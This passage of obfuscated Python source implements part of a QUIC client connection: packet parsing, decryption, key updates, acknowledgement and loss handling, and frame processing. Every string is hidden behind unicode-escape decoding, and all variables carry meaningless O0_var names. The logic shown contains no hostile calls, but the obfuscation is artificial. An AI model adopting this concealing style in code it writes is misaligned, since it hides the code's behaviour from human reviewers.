            self.log.debug(codecs.decode('\\u0071\\u0075\\u0069\\u0063\\u0020\\u0073\\u0065\\u006e\\u0064\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0025\\u0073', 'unicode_escape'), exc)
        self.stats[codecs.decode('\\u0074\\u0078', 'unicode_escape')] += 1
        self.stats[codecs.decode('\\u0074\\u0078\\u005f\\u0062\\u0079\\u0074\\u0065\\u0073', 'unicode_escape')] += len(O0_var_1354[codecs.decode('\\u0070\\u0061\\u0063\\u006b\\u0065\\u0074', 'unicode_escape')])
        if O0_var_1354[codecs.decode('\\u0065\\u0070\\u006f\\u0063\\u0068', 'unicode_escape')] == QUIC_EPOCH_INITIAL:
            self.initial_sent += 1
        if O0_var_1354[codecs.decode('\\u0065\\u0070\\u006f\\u0063\\u0068', 'unicode_escape')] == QUIC_EPOCH_HANDSHAKE and (not self.crypto_send[QUIC_EPOCH_HANDSHAKE].pending):
            self.finished_sent = True
        if O0_var_1354[codecs.decode('\\u0061\\u0063\\u006b\\u005f\\u0065\\u006c\\u0069\\u0063\\u0069\\u0074\\u0069\\u006e\\u0067', 'unicode_escape')]:
            O0_var_1355 = O0_var_1354[codecs.decode('\\u006d\\u0065\\u0074\\u0061', 'unicode_escape')][codecs.decode('\\u0063\\u0072\\u0079\\u0070\\u0074\\u006f', 'unicode_escape')] is not None and O0_var_1354[codecs.decode('\\u006d\\u0065\\u0074\\u0061', 'unicode_escape')][codecs.decode('\\u0063\\u0072\\u0079\\u0070\\u0074\\u006f', 'unicode_escape')].get(codecs.decode('\\u0072\\u0065\\u0074\\u0072\\u0061\\u006e\\u0073\\u006d\\u0069\\u0074\\u0074\\u0065\\u0064', 'unicode_escape')) is True or any((O0_var_1356.get(codecs.decode('\\u0072\\u0065\\u0074\\u0072\\u0061\\u006e\\u0073\\u006d\\u0069\\u0074\\u0074\\u0065\\u0064', 'unicode_escape')) is True for O0_var_1356 in O0_var_1354[codecs.decode('\\u006d\\u0065\\u0074\\u0061', 'unicode_escape')][codecs.decode('\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d\\u0073', 'unicode_escape')]))
            self.in_flight[O0_var_1354[codecs.decode('\\u0065\\u0070\\u006f\\u0063\\u0068', 'unicode_escape')]].append({codecs.decode('\\u0070\\u006e', 'unicode_escape'): O0_var_1354[codecs.decode('\\u0070\\u006e', 'unicode_escape')], codecs.decode('\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'): time.time() * 1000, codecs.decode('\\u0062\\u0079\\u0074\\u0065\\u0073', 'unicode_escape'): len(O0_var_1354[codecs.decode('\\u0070\\u0061\\u0063\\u006b\\u0065\\u0074', 'unicode_escape')]), codecs.decode('\\u0063\\u0072\\u0079\\u0070\\u0074\\u006f', 'unicode_escape'): O0_var_1354[codecs.decode('\\u006d\\u0065\\u0074\\u0061', 'unicode_escape')][codecs.decode('\\u0063\\u0072\\u0079\\u0070\\u0074\\u006f', 'unicode_escape')], codecs.decode('\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d\\u0073', 'unicode_escape'): O0_var_1354[codecs.decode('\\u006d\\u0065\\u0074\\u0061', 'unicode_escape')][codecs.decode('\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d\\u0073', 'unicode_escape')], codecs.decode('\\u0072\\u0065\\u0074\\u0072\\u0061\\u006e\\u0073\\u006d\\u0069\\u0074\\u0074\\u0065\\u0064', 'unicode_escape'): O0_var_1355})
            self.last_eliciting = time.time() * 1000

    def _on_datagram(self, message):
        self.stats[codecs.decode('\\u0072\\u0078', 'unicode_escape')] += 1
        self.stats[codecs.decode('\\u0072\\u0078\\u005f\\u0062\\u0079\\u0074\\u0065\\u0073', 'unicode_escape')] += len(message)
        self.last_received = time.time() * 1000
        O0_var_1357 = 0
        while O0_var_1357 < len(message):
            O0_var_1358 = message[O0_var_1357]
            if not O0_var_1358 & 128:
                self._handle_short(message[O0_var_1357:])
                return
            O0_var_1359 = message[O0_var_1357:]
            O0_var_1360 = self._parse_long(O0_var_1359)
            if O0_var_1360 is None:
                return
            if O0_var_1360[codecs.decode('\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape')] != QUIC_VERSION:
                self.log.debug(codecs.decode('\\u0072\\u0078\\u0020\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e\\u0020\\u006e\\u0065\\u0067\\u006f\\u0074\\u0069\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u006f\\u0072\\u0020\\u0075\\u006e\\u006b\\u006e\\u006f\\u0077\\u006e\\u0020\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e\\u0020\\u0025\\u0023\\u0078', 'unicode_escape'), O0_var_1360[codecs.decode('\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape')])
                return
            if O0_var_1360[codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape')] == 3:
                self._handle_retry(O0_var_1360)
                return
            O0_var_1361 = min(len(O0_var_1359), O0_var_1360[codecs.decode('\\u0070\\u006e\\u005f\\u006f\\u0066\\u0066\\u0073\\u0065\\u0074', 'unicode_escape')] + O0_var_1360[codecs.decode('\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape')])
            self._handle_long(O0_var_1359[:O0_var_1361], O0_var_1360)
            O0_var_1357 += O0_var_1361

    def _parse_long(self, O0_var_1362):
        if len(O0_var_1362) < 7:
            return None
        O0_var_1363 = O0_var_1362[0]
        O0_var_1364 = int.from_bytes(O0_var_1362[1:5], codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape'))
        O0_var_1365 = (O0_var_1363 & 48) >> 4
        O0_var_1366 = 5
        O0_var_1367 = O0_var_1362[O0_var_1366]
        O0_var_1366 += 1
        if len(O0_var_1362) - O0_var_1366 < O0_var_1367 + 1:
            return None
        O0_var_1368 = O0_var_1362[O0_var_1366:O0_var_1366 + O0_var_1367]
        O0_var_1366 += O0_var_1367
        O0_var_1369 = O0_var_1362[O0_var_1366]
        O0_var_1366 += 1
        if len(O0_var_1362) - O0_var_1366 < O0_var_1369:
            return None
        O0_var_1370 = O0_var_1362[O0_var_1366:O0_var_1366 + O0_var_1369]
        O0_var_1366 += O0_var_1369
        O0_var_1371 = b''
        if O0_var_1365 == 0:
            O0_var_1372 = O0_fn_33(O0_var_1362, O0_var_1366)
            if O0_var_1372 is None:
                return None
            O0_var_1373, O0_var_1366 = (O0_var_1372[0], O0_var_1366 + O0_var_1372[1])
            if len(O0_var_1362) - O0_var_1366 < O0_var_1373:
                return None
            O0_var_1371 = O0_var_1362[O0_var_1366:O0_var_1366 + O0_var_1373]
            O0_var_1366 += O0_var_1373
        if O0_var_1365 == 3:
            return {codecs.decode('\\u0066\\u0069\\u0072\\u0073\\u0074', 'unicode_escape'): O0_var_1363, codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'): O0_var_1365, codecs.decode('\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'): O0_var_1364, codecs.decode('\\u0064\\u0063\\u0069\\u0064', 'unicode_escape'): O0_var_1368, codecs.decode('\\u0073\\u0063\\u0069\\u0064', 'unicode_escape'): O0_var_1370, codecs.decode('\\u0074\\u006f\\u006b\\u0065\\u006e', 'unicode_escape'): O0_var_1362[O0_var_1366:len(O0_var_1362) - 16], codecs.decode('\\u0070\\u006e\\u005f\\u006f\\u0066\\u0066\\u0073\\u0065\\u0074', 'unicode_escape'): 0, codecs.decode('\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape'): 0, codecs.decode('\\u0072\\u0065\\u0074\\u0072\\u0079', 'unicode_escape'): True}
        O0_var_1374 = O0_fn_33(O0_var_1362, O0_var_1366)
        if O0_var_1374 is None:
            return None
        O0_var_1375 = O0_var_1374[0]
        O0_var_1366 += O0_var_1374[1]
        return {codecs.decode('\\u0066\\u0069\\u0072\\u0073\\u0074', 'unicode_escape'): O0_var_1363, codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'): O0_var_1365, codecs.decode('\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'): O0_var_1364, codecs.decode('\\u0064\\u0063\\u0069\\u0064', 'unicode_escape'): O0_var_1368, codecs.decode('\\u0073\\u0063\\u0069\\u0064', 'unicode_escape'): O0_var_1370, codecs.decode('\\u0074\\u006f\\u006b\\u0065\\u006e', 'unicode_escape'): O0_var_1371, codecs.decode('\\u0070\\u006e\\u005f\\u006f\\u0066\\u0066\\u0073\\u0065\\u0074', 'unicode_escape'): O0_var_1366, codecs.decode('\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape'): O0_var_1375, codecs.decode('\\u0072\\u0065\\u0074\\u0072\\u0079', 'unicode_escape'): False}

    def _handle_retry(self, O0_var_1376):
        self.peer_token = bytes(O0_var_1376[codecs.decode('\\u0074\\u006f\\u006b\\u0065\\u006e', 'unicode_escape')])
        self.peer_cid = bytes(O0_var_1376[codecs.decode('\\u0073\\u0063\\u0069\\u0064', 'unicode_escape')])
        self.pn_send[QUIC_EPOCH_INITIAL] = 0
        self.in_flight[QUIC_EPOCH_INITIAL] = []
        self.crypto_send[QUIC_EPOCH_INITIAL].loss()
        self.initial_sent = 0

    def _epoch_for_type(self, O0_var_1377):
        if O0_var_1377 in (0, 1):
            return QUIC_EPOCH_INITIAL
        return QUIC_EPOCH_HANDSHAKE

    def _handle_long(self, O0_var_1378, O0_var_1379):
        O0_var_1380 = self._epoch_for_type(O0_var_1379[codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape')])
        O0_var_1381 = self.keys[O0_var_1380]
        if O0_var_1381 is None or O0_var_1379[codecs.decode('\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape')] < QUIC_PN_LEN:
            self.stats[codecs.decode('\\u0064\\u0072\\u006f\\u0070\\u0070\\u0065\\u0064', 'unicode_escape')] += 1
            return
        O0_var_1382 = _quic_remove_protection(O0_var_1381[codecs.decode('\\u0072\\u0065\\u0063\\u0076', 'unicode_escape')], O0_var_1378, O0_var_1379[codecs.decode('\\u0070\\u006e\\u005f\\u006f\\u0066\\u0066\\u0073\\u0065\\u0074', 'unicode_escape')], True)
        if O0_var_1382 is None:
            self.stats[codecs.decode('\\u0064\\u0072\\u006f\\u0070\\u0070\\u0065\\u0064', 'unicode_escape')] += 1
            return
        O0_var_1383, O0_var_1384 = O0_var_1382
        O0_var_1385 = (O0_var_1383[0] & 3) + 1
        O0_var_1386 = _quic_decode_packet_number(max(self.largest_recv[O0_var_1380], 0), O0_var_1385 * 8, O0_var_1384)
        try:
            O0_var_1387 = O0_var_1381[codecs.decode('\\u0072\\u0065\\u0063\\u0076', 'unicode_escape')].open(O0_var_1386, O0_var_1383, O0_var_1378[O0_var_1379[codecs.decode('\\u0070\\u006e\\u005f\\u006f\\u0066\\u0066\\u0073\\u0065\\u0074', 'unicode_escape')] + O0_var_1385:])
        except Exception as exc:
            self.stats[codecs.decode('\\u0064\\u0072\\u006f\\u0070\\u0070\\u0065\\u0064', 'unicode_escape')] += 1
            self.log.debug(codecs.decode('\\u0072\\u0078\\u0020\\u0025\\u0064\\u0042\\u0020\\u0025\\u0073\\u0020\\u0075\\u006e\\u0064\\u0065\\u0063\\u0072\\u0079\\u0070\\u0074\\u0061\\u0062\\u006c\\u0065', 'unicode_escape'), len(O0_var_1378), QUIC_EPOCH_NAMES[O0_var_1380])
            return
        if O0_var_1380 == QUIC_EPOCH_INITIAL and O0_var_1379[codecs.decode('\\u0064\\u0063\\u0069\\u0064', 'unicode_escape')] == self.our_cid:
            if not self.handshake_complete and O0_var_1379[codecs.decode('\\u0073\\u0063\\u0069\\u0064', 'unicode_escape')] and (self.peer_cid != O0_var_1379[codecs.decode('\\u0073\\u0063\\u0069\\u0064', 'unicode_escape')]):
                self.peer_cid = bytes(O0_var_1379[codecs.decode('\\u0073\\u0063\\u0069\\u0064', 'unicode_escape')])
                self.log.debug(codecs.decode('\\u0071\\u0075\\u0069\\u0063\\u0020\\u0070\\u0065\\u0065\\u0072\\u0020\\u0063\\u0069\\u0064\\u0020\\u0025\\u0073', 'unicode_escape'), self.peer_cid.hex())
        self._record_received(O0_var_1380, O0_var_1386)
        if O0_var_1380 == QUIC_EPOCH_HANDSHAKE:
            self._discard_epoch(QUIC_EPOCH_INITIAL, codecs.decode('\\u0068\\u0061\\u006e\\u0064\\u0073\\u0068\\u0061\\u006b\\u0065\\u0020\\u0070\\u0061\\u0063\\u006b\\u0065\\u0074\\u0020\\u0072\\u0065\\u0063\\u0065\\u0069\\u0076\\u0065\\u0064', 'unicode_escape'))
        self._handle_frames(O0_var_1387, O0_var_1380)

    def _handle_short(self, O0_var_1388):
        O0_var_1389 = self.keys[QUIC_EPOCH_APPLICATION]
        if O0_var_1389 is None:
            self.stats[codecs.decode('\\u0064\\u0072\\u006f\\u0070\\u0070\\u0065\\u0064', 'unicode_escape')] += 1
            return
        if not self.app_recv_gens:
            self.app_recv_gens.append({codecs.decode('\\u006b\\u0065\\u0079\\u0073', 'unicode_escape'): O0_var_1389[codecs.decode('\\u0072\\u0065\\u0063\\u0076', 'unicode_escape')], codecs.decode('\\u0070\\u0068\\u0061\\u0073\\u0065', 'unicode_escape'): 0})
        O0_var_1390 = 1 + len(self.our_cid)
        O0_var_1391 = [O0_var_1389[codecs.decode('\\u0072\\u0065\\u0063\\u0076', 'unicode_escape')]]
        for O0_var_1392 in self.app_recv_gens:
            if O0_var_1392[codecs.decode('\\u006b\\u0065\\u0079\\u0073', 'unicode_escape')] not in O0_var_1391:
                O0_var_1391.append(O0_var_1392[codecs.decode('\\u006b\\u0065\\u0079\\u0073', 'unicode_escape')])
        O0_var_1393 = self.app_recv_gens[0]
        O0_var_1394 = self.app_recv_gens + [{codecs.decode('\\u006b\\u0065\\u0079\\u0073', 'unicode_escape'): O0_fn_35(O0_var_1393[codecs.decode('\\u006b\\u0065\\u0079\\u0073', 'unicode_escape')]), codecs.decode('\\u0070\\u0068\\u0061\\u0073\\u0065', 'unicode_escape'): 1 - O0_var_1393[codecs.decode('\\u0070\\u0068\\u0061\\u0073\\u0065', 'unicode_escape')], codecs.decode('\\u006e\\u0065\\u0078\\u0074', 'unicode_escape'): True}]
        for O0_var_1392 in O0_var_1394:
            O0_var_1395 = O0_var_1391 + [O0_var_1392[codecs.decode('\\u006b\\u0065\\u0079\\u0073', 'unicode_escape')]] if O0_var_1392.get(codecs.decode('\\u006e\\u0065\\u0078\\u0074', 'unicode_escape')) else O0_var_1391
            for O0_var_1396 in O0_var_1395:
                O0_var_1397 = _quic_remove_protection(O0_var_1396, O0_var_1388, O0_var_1390, False)
                if O0_var_1397 is None:
                    continue
                O0_var_1398, O0_var_1399 = O0_var_1397
                O0_var_1400 = (O0_var_1398[0] & 3) + 1
                O0_var_1401 = _quic_decode_packet_number(max(self.largest_recv[QUIC_EPOCH_APPLICATION], 0), O0_var_1400 * 8, O0_var_1399)
                try:
                    O0_var_1402 = O0_var_1392[codecs.decode('\\u006b\\u0065\\u0079\\u0073', 'unicode_escape')].open(O0_var_1401, O0_var_1398, O0_var_1388[O0_var_1390 + O0_var_1400:])
                except Exception:
                    continue
                if O0_var_1392.get(codecs.decode('\\u006e\\u0065\\u0078\\u0074', 'unicode_escape')):
                    self.app_recv_gens.insert(0, {codecs.decode('\\u006b\\u0065\\u0079\\u0073', 'unicode_escape'): O0_var_1392[codecs.decode('\\u006b\\u0065\\u0079\\u0073', 'unicode_escape')], codecs.decode('\\u0070\\u0068\\u0061\\u0073\\u0065', 'unicode_escape'): O0_var_1392[codecs.decode('\\u0070\\u0068\\u0061\\u0073\\u0065', 'unicode_escape')]})
                    if len(self.app_recv_gens) > 2:
                        self.app_recv_gens.pop()
                    self.app_key_phase = O0_var_1392[codecs.decode('\\u0070\\u0068\\u0061\\u0073\\u0065', 'unicode_escape')]
                    self.app_send_keys[O0_var_1392[codecs.decode('\\u0070\\u0068\\u0061\\u0073\\u0065', 'unicode_escape')]] = O0_fn_35(self.app_send_keys[1 - O0_var_1392[codecs.decode('\\u0070\\u0068\\u0061\\u0073\\u0065', 'unicode_escape')]], True)
                    self.log.debug(codecs.decode('\\u0071\\u0075\\u0069\\u0063\\u0020\\u006b\\u0065\\u0079\\u0020\\u0070\\u0068\\u0061\\u0073\\u0065\\u0020\\u0025\\u0064\\u0020\\u0075\\u0070\\u0064\\u0061\\u0074\\u0065\\u0064', 'unicode_escape'), O0_var_1392[codecs.decode('\\u0070\\u0068\\u0061\\u0073\\u0065', 'unicode_escape')])
                self._record_received(QUIC_EPOCH_APPLICATION, O0_var_1401)
                self._handle_frames(O0_var_1402, QUIC_EPOCH_APPLICATION)
                return
        self.stats[codecs.decode('\\u0064\\u0072\\u006f\\u0070\\u0070\\u0065\\u0064', 'unicode_escape')] += 1
        self.log.debug(codecs.decode('\\u0072\\u0078\\u0020\\u0025\\u0064\\u0042\\u0020\\u006f\\u006e\\u0065\\u002d\\u0072\\u0074\\u0074\\u0020\\u0075\\u006e\\u0064\\u0065\\u0063\\u0072\\u0079\\u0070\\u0074\\u0061\\u0062\\u006c\\u0065', 'unicode_escape'), len(O0_var_1388))

    def _record_received(self, O0_var_1403, O0_var_1404):
        self.recv_ranges[O0_var_1403] = _ranges_union(self.recv_ranges[O0_var_1403], [{codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape'): O0_var_1404, codecs.decode('\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape'): 1}])
        if O0_var_1404 > self.largest_recv[O0_var_1403]:
            self.largest_recv[O0_var_1403] = O0_var_1404
        self.ack_pending[O0_var_1403] = True

    def _apply_ack(self, O0_var_1405, O0_var_1406):
        O0_var_1407 = time.time() * 1000
        O0_var_1408 = 0
        if O0_var_1406 and isinstance(O0_var_1406[-1], dict) and (codecs.decode('\\u0061\\u0063\\u006b\\u005f\\u0064\\u0065\\u006c\\u0061\\u0079', 'unicode_escape') in O0_var_1406[-1]):
            O0_var_1408 = O0_var_1406[-1][codecs.decode('\\u0061\\u0063\\u006b\\u005f\\u0064\\u0065\\u006c\\u0061\\u0079', 'unicode_escape')]
            O0_var_1406 = O0_var_1406[:-1]
        O0_var_1409 = self.in_flight[O0_var_1405]
        O0_var_1410 = -1
        for O0_var_1411 in O0_var_1406:
            O0_var_1410 = max(O0_var_1410, O0_var_1411[codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape')] + O0_var_1411[codecs.decode('\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape')] - 1)
        O0_var_1412 = []
        O0_var_1413 = 0
        O0_var_1414 = None
        for O0_var_1415 in O0_var_1409:
            O0_var_1416 = any((O0_var_1415[codecs.decode('\\u0070\\u006e', 'unicode_escape')] >= O0_var_1411[codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape')] and O0_var_1415[codecs.decode('\\u0070\\u006e', 'unicode_escape')] < O0_var_1411[codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape')] + O0_var_1411[codecs.decode('\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape')] for O0_var_1411 in O0_var_1406))
            if not O0_var_1416:
                O0_var_1412.append(O0_var_1415)
                continue
            O0_var_1413 += O0_var_1415[codecs.decode('\\u0062\\u0079\\u0074\\u0065\\u0073', 'unicode_escape')]
            if O0_var_1415[codecs.decode('\\u0070\\u006e', 'unicode_escape')] == O0_var_1410 and O0_var_1415[codecs.decode('\\u0072\\u0065\\u0074\\u0072\\u0061\\u006e\\u0073\\u006d\\u0069\\u0074\\u0074\\u0065\\u0064', 'unicode_escape')] is not True:
                O0_var_1414 = O0_var_1407 - O0_var_1415[codecs.decode('\\u0074\\u0069\\u006d\\u0065', 'unicode_escape')] - min(O0_var_1408, self.peer_max_ack_delay)
            if O0_var_1415[codecs.decode('\\u0063\\u0072\\u0079\\u0070\\u0074\\u006f', 'unicode_escape')]:
                self.crypto_send[O0_var_1405].ack(O0_var_1415[codecs.decode('\\u0063\\u0072\\u0079\\u0070\\u0074\\u006f', 'unicode_escape')][codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape')], O0_var_1415[codecs.decode('\\u0063\\u0072\\u0079\\u0070\\u0074\\u006f', 'unicode_escape')][codecs.decode('\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape')], False)
            for O0_var_1417 in O0_var_1415[codecs.decode('\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d\\u0073', 'unicode_escape')]:
                O0_var_1417[codecs.decode('\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d', 'unicode_escape')].send.ack(O0_var_1417[codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape')], O0_var_1417[codecs.decode('\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape')], O0_var_1417[codecs.decode('\\u0066\\u0069\\u006e', 'unicode_escape')])
        O0_var_1418, O0_var_1419 = ([], [])
        for O0_var_1415 in O0_var_1412:
            if O0_var_1410 - O0_var_1415[codecs.decode('\\u0070\\u006e', 'unicode_escape')] >= self.k_packet_threshold:
                O0_var_1419.append(O0_var_1415)
            else:
                O0_var_1418.append(O0_var_1415)
        self.in_flight[O0_var_1405] = O0_var_1418
        if O0_var_1413:
            if O0_var_1414 is not None and O0_var_1414 > 0:
                self._record_rtt_sample(O0_var_1414)
            self.on_send_progress()
            self._grow_window(O0_var_1413)
        for O0_var_1415 in O0_var_1419:
            self._return_lost(O0_var_1405, O0_var_1415)
        if O0_var_1419:
            self._on_loss(O0_var_1405)
        if O0_var_1405 == QUIC_EPOCH_APPLICATION and len(O0_var_1418) < len(O0_var_1409):
            self._confirm_handshake()

    def _grow_window(self, O0_var_1420):
        if self.congestion_window < self.slow_start_threshold:
            self.congestion_window += O0_var_1420
        else:
            self.congestion_window += max(1, self.max_packet * O0_var_1420 // self.congestion_window)
        self.congestion_window = min(self.congestion_window, self.max_window)

    def _handle_frames(self, O0_var_1421, O0_var_1422):
        O0_var_1423 = 0
        while O0_var_1423 < len(O0_var_1421):
            O0_var_1424 = O0_var_1421[O0_var_1423]
            O0_var_1423 += 1
            if O0_var_1424 in (QUIC_FRAME[codecs.decode('\\u0070\\u0061\\u0064\\u0064\\u0069\\u006e\\u0067', 'unicode_escape')], QUIC_FRAME[codecs.decode('\\u0070\\u0069\\u006e\\u0067', 'unicode_escape')]):
                continue
            if O0_var_1424 in (QUIC_FRAME[codecs.decode('\\u0061\\u0063\\u006b', 'unicode_escape')], QUIC_FRAME[codecs.decode('\\u0061\\u0063\\u006b\\u005f\\u0065\\u0063\\u006e', 'unicode_escape')]):
                O0_var_1425 = {codecs.decode('\\u0062\\u0075\\u0066\\u0066\\u0065\\u0072', 'unicode_escape'): O0_var_1421, codecs.decode('\\u0070\\u006f\\u0073', 'unicode_escape'): O0_var_1423, codecs.decode('\\u006e\\u0075\\u006d\\u0062\\u0065\\u0072', 'unicode_escape'): lambda r: self._reader_number(r)}
                O0_var_1426 = _quic_ranges_from_ack(O0_var_1425)
                O0_var_1423 = O0_var_1425[codecs.decode('\\u0070\\u006f\\u0073', 'unicode_escape')]
                if O0_var_1424 == QUIC_FRAME[codecs.decode('\\u0061\\u0063\\u006b\\u005f\\u0065\\u0063\\u006e', 'unicode_escape')]:
                    for O0_var_1427 in range(3):
                        O0_var_1428 = O0_fn_33(O0_var_1421, O0_var_1423)
                        O0_var_1423 += O0_var_1428[1]
                self._apply_ack(O0_var_1422, O0_var_1426)
                continue
            if O0_var_1424 == QUIC_FRAME[codecs.decode('\\u0063\\u0072\\u0079\\u0070\\u0074\\u006f', 'unicode_escape')]:
                O0_var_1428 = O0_fn_33(O0_var_1421, O0_var_1423)
                O0_var_1429, O0_var_1423 = (O0_var_1428[0], O0_var_1423 + O0_var_1428[1])
                O0_var_1428 = O0_fn_33(O0_var_1421, O0_var_1423)
                O0_var_1430, O0_var_1423 = (O0_var_1428[0], O0_var_1423 + O0_var_1428[1])
                if len(O0_var_1421) - O0_var_1423 < O0_var_1430:
                    return
                O0_var_1431 = self.tls_offsets[O0_var_1422].accept(O0_var_1429, O0_var_1421[O0_var_1423:O0_var_1423 + O0_var_1430])
                O0_var_1423 += O0_var_1430
                if O0_var_1431:
                    self._consume_tls(O0_var_1422, O0_var_1431)
                continue
            if O0_var_1424 & 248 == QUIC_FRAME[codecs.decode('\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d', 'unicode_escape')]:
                O0_var_1432 = O0_var_1424 & 7
                O0_var_1428 = O0_fn_33(O0_var_1421, O0_var_1423)
                O0_var_1433, O0_var_1423 = (O0_var_1428[0], O0_var_1423 + O0_var_1428[1])
                O0_var_1434 = bool(O0_var_1432 & 2)
                O0_var_1435 = bool(O0_var_1432 & 4)
                O0_var_1436 = bool(O0_var_1432 & 1)
                O0_var_1437 = 0
                if O0_var_1435:
                    O0_var_1428 = O0_fn_33(O0_var_1421, O0_var_1423)
                    O0_var_1437, O0_var_1423 = (O0_var_1428[0], O0_var_1423 + O0_var_1428[1])
                O0_var_1430 = len(O0_var_1421) - O0_var_1423
                if O0_var_1434:
                    O0_var_1428 = O0_fn_33(O0_var_1421, O0_var_1423)
                    O0_var_1430, O0_var_1423 = (O0_var_1428[0], O0_var_1423 + O0_var_1428[1])
                if len(O0_var_1421) - O0_var_1423 < O0_var_1430:
                    return
                self._deliver_stream(O0_var_1433, O0_var_1437, O0_var_1421[O0_var_1423:O0_var_1423 + O0_var_1430], O0_var_1436)
                O0_var_1423 += O0_var_1430
                continue
            if O0_var_1424 == QUIC_FRAME[codecs.decode('\\u006d\\u0061\\u0078\\u005f\\u0064\\u0061\\u0074\\u0061', 'unicode_escape')]:
                O0_var_1428 = O0_fn_33(O0_var_1421, O0_var_1423)
                self.peer_max_data = max(self.peer_max_data, O0_var_1428[0])
                O0_var_1423 += O0_var_1428[1]
                continue
            if O0_var_1424 == QUIC_FRAME[codecs.decode('\\u006d\\u0061\\u0078\\u005f\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d\\u005f\\u0064\\u0061\\u0074\\u0061', 'unicode_escape')]:
                O0_var_1428 = O0_fn_33(O0_var_1421, O0_var_1423)
                O0_var_1433, O0_var_1423 = (O0_var_1428[0], O0_var_1423 + O0_var_1428[1])
                O0_var_1438 = self.streams.get(O0_var_1433)
                if O0_var_1438 is not None:
                    O0_var_1428 = O0_fn_33(O0_var_1421, O0_var_1423)
                    O0_var_1438.peer_limit = max(O0_var_1438.peer_limit, O0_var_1428[0])
                    O0_var_1423 += O0_var_1428[1]
                else:
                    O0_var_1428 = O0_fn_33(O0_var_1421, O0_var_1423)
                    O0_var_1423 += O0_var_1428[1]
                continue
            if O0_var_1424 in (QUIC_FRAME[codecs.decode('\\u006d\\u0061\\u0078\\u005f\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d\\u0073\\u005f\\u0062\\u0069\\u0064\\u0069', 'unicode_escape')], QUIC_FRAME[codecs.decode('\\u006d\\u0061\\u0078\\u005f\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d\\u0073\\u005f\\u0075\\u006e\\u0069', 'unicode_escape')]):
                O0_var_1428 = O0_fn_33(O0_var_1421, O0_var_1423)
                O0_var_1423 += O0_var_1428[1]
                continue
            if O0_var_1424 == QUIC_FRAME[codecs.decode('\\u006e\\u0065\\u0077\\u005f\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e\\u005f\\u0069\\u0064', 'unicode_escape')]:
                O0_var_1428 = O0_fn_33(O0_var_1421, O0_var_1423)
                O0_var_1423 += O0_var_1428[1]
                O0_var_1428 = O0_fn_33(O0_var_1421, O0_var_1423)
                O0_var_1423 += O0_var_1428[1]
                O0_var_1439 = O0_var_1421[O0_var_1423]
                O0_var_1423 += 1
                if len(O0_var_1421) - O0_var_1423 < O0_var_1439 + 16:
                    return
                O0_var_1423 += O0_var_1439 + 16
                continue
            if O0_var_1424 == QUIC_FRAME[codecs.decode('\\u0072\\u0065\\u0074\\u0069\\u0072\\u0065\\u005f\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e\\u005f\\u0069\\u0064', 'unicode_escape')]:
                O0_var_1428 = O0_fn_33(O0_var_1421, O0_var_1423)
                O0_var_1423 += O0_var_1428[1]
                continue
            if O0_var_1424 == QUIC_FRAME[codecs.decode('\\u0070\\u0061\\u0074\\u0068\\u005f\\u0063\\u0068\\u0061\\u006c\\u006c\\u0065\\u006e\\u0067\\u0065', 'unicode_escape')]:
                if len(O0_var_1421) - O0_var_1423 < 8:
                    return
                O0_var_1440 = O0_var_1421[O0_var_1423:O0_var_1423 + 8]
                O0_var_1423 += 8
                self._queue_one_off_frame(bytes([QUIC_FRAME[codecs.decode('\\u0070\\u0061\\u0074\\u0068\\u005f\\u0072\\u0065\\u0073\\u0070\\u006f\\u006e\\u0073\\u0065', 'unicode_escape')]]) + O0_var_1440, O0_var_1422)
                continue
            if O0_var_1424 == QUIC_FRAME[codecs.decode('\\u0070\\u0061\\u0074\\u0068\\u005f\\u0072\\u0065\\u0073\\u0070\\u006f\\u006e\\u0073\\u0065', 'unicode_escape')]:
                continue
            if O0_var_1424 == QUIC_FRAME[codecs.decode('\\u0068\\u0061\\u006e\\u0064\\u0073\\u0068\\u0061\\u006b\\u0065\\u005f\\u0064\\u006f\\u006e\\u0065', 'unicode_escape')]:
                self._confirm_handshake()
                continue
